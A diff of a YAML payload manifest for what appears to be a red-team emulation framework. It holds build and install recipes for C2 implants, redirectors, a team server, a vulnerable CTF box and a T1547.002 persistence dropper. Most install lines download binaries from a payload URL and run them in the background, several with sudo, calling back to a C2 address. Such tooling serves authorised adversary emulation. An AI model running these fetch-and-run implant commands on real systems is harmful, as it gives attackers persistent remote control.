@@ -1,11 +1,130 @@
-T1547.002:
+translators:
   metadata:
-    description: Dropper and payload for T1547.002
-    purpose: payloads
+    description: Extra Operator listening posts for redirectors
+    purpose: redirector
+    build: |
+      tar zcf DST.PATH/ftp.tar.gz -C SRC.PATH ftp && tar zcf DST.PATH/grpc.tar.gz -C SRC.PATH grpc
   payloads:
-    package:
-      build: |
-        cl.exe /W1 package.c package.def /MT /link /DLL /OUT:package.dll
-    install:
-      build: |
-        dotnet publish -c Release -r win-x64
+    ftp.tar.gz:
+      install: |
+        mkdir -p /tmp/translators && \
+        curl 'PAYLOAD.URL' > /tmp/translators/ftp.tar.gz && \
+        tar xzf /tmp/translators/ftp.tar.gz -C /tmp/translators && \
+        sudo pip3 install -r /tmp/translators/ftp/requirements.txt && \
+        nohup sudo python3 /tmp/translators/ftp/server.py &
+    grpc.tar.gz:
+      install: |
+        mkdir -p /tmp/translators && \
+        curl 'PAYLOAD.URL' > /tmp/translators/grpc.tar.gz && \
+        tar xzf /tmp/translators/grpc.tar.gz -C /tmp/translators && \
+        sudo pip3 install -r /tmp/translators/grpc/requirements.txt && \
+        nohup sudo python3 /tmp/translators/grpc/server.py &
+
+pneuma:
+  metadata:
+    description: The default open-source agent written in GoLang
+    purpose: agent
+    zip: 1
+    build: |
+      GOOS=darwin go build -ldflags="-s -w -X main.randomHash=$(openssl rand -base64 16)" -o DST.PATH/pneuma-darwin SRC.PATH/main.go && \
+      GOOS=linux go build -ldflags="-s -w -X main.randomHash=$(openssl rand -base64 16)" -o DST.PATH/pneuma-linux SRC.PATH/main.go && \
+      GOOS=windows go build -ldflags="-s -w -X main.randomHash=$(openssl rand -base64 16)" -o DST.PATH/pneuma-windows.exe SRC.PATH/main.go
+    platforms:
+      - linux
+      - windows
+      - darwin
+    protocols:
+      - tcp
+      - http
+      - udp
+      - grpc
+  payloads:
+    pneuma-linux:
+      install: |
+        curl 'PAYLOAD.URL' > /tmp/pneuma && chmod +x /tmp/pneuma && nohup /tmp/pneuma -name $(echo $HOSTNAME) -address #{callback} -range "Cloud" &
+    pneuma-windows.exe:
+      install: |
+        mkdir "c:\aws\download"
+        Set-Location "c:\aws\download"
+        $wc = New-Object System.Net.WebClient
+        $myurl="PAYLOAD.URL"
+        $wc.DownloadFile("$myurl","C:\aws\download\pneuma-windows.exe")
+        Start-Process -FilePath C:\aws\download\pneuma-windows.exe -ArgumentList "-name $env:COMPUTERNAME -address #{callback} -range Cloud"
+    pneuma-darwin: {}
+
+schism:
+  metadata:
+    description: Simple FTP agent (requires a translator)
+    purpose: agent
+    zip: 1
+    build: |
+      cp SRC.PATH/schism.py DST.PATH
+    platforms: 
+      - windows
+      - linux
+      - darwin
+    protocols:
+      - ftp
+  payloads:
+    schism.py:
+      install: |
+        curl 'PAYLOAD.URL' > /tmp/schism && chmod +x /tmp/schism && pip install ftplib && nohup /tmp/schism -address #{callback} &
+
+nicodemus:
+  metadata:
+    description: Nicodemus is a cross-platform Nim implant written by Roger Johnston (VVX7 - https://github.com/VVX7/nicodemus).
+    purpose: agent
+    zip: 1
+    build: |
+      docker run --rm -v REPO.CWD:/usr/local/src -w /usr/local/src/payloads/src/nicodemus chrishellerappsian/docker-nim-cross:latest ./build-docker.sh;
+      cp SRC.PATH/payloads/* DST.PATH;
+    platforms:
+      - windows
+      - linux
+      - darwin
+    protocols:
+      - http
+      - tcp
+      - udp
+  payloads:
+    nicodemus-darwin: {}
+    nicodemus-linux: {}
+    nicodemus-windows.exe: {}
+
+ctf:
+  metadata:
+    description: Create a vulnerable environment to practice against
+    purpose: virtualmachine
+    build: |
+      cp SRC.PATH/vulnerable.sh DST.PATH
+    platforms: 
+      - linux
+  payloads:
+    vulnerable.sh:
+      install: curl 'PAYLOAD.URL' > tmp/vulnerable.sh && chmod +x /tmp/vulnerable.sh && sudo ./vulnerable.sh
+
+team:
+  metadata:
+    description: Headless Operator API / Team Server
+    purpose: redirector
+    required: team
+    default: team
+    download:
+      headless: https://s3.amazonaws.com/operator.payloads.open/payloads/team/headless-linux
+  payloads:
+    headless:
+      install: |
+        mkdir -p /tmp/headless && curl 'PAYLOAD.URL' > /tmp/headless/bin && chmod +x /tmp/headless/bin && ssh-keygen -t rsa -f /tmp/headless/ssh_key -q -N '' && nohup sudo /tmp/headless/bin --sessionToken 'TOOL.PSK' --sshKey /tmp/headless/ssh_key --hostName $(curl http://169.254.169.254/latest/meta-data/public-hostname) &
+T1547.002:
+   metadata:
+     description: Dropper and payload for T1547.002
+     build: |
+       cd SRC.PATH/T1547.002/install/
+       dotnet publish -c Release -r win-x64 -o .
+       cd SRC.PATH/T1547.002/package/
+
+       cl.exe /W1 package.c package.def /MT /link /DLL /OUT:package.dll
+     platforms:
+       - windows
+   payloads:
+     T1547.002: {}
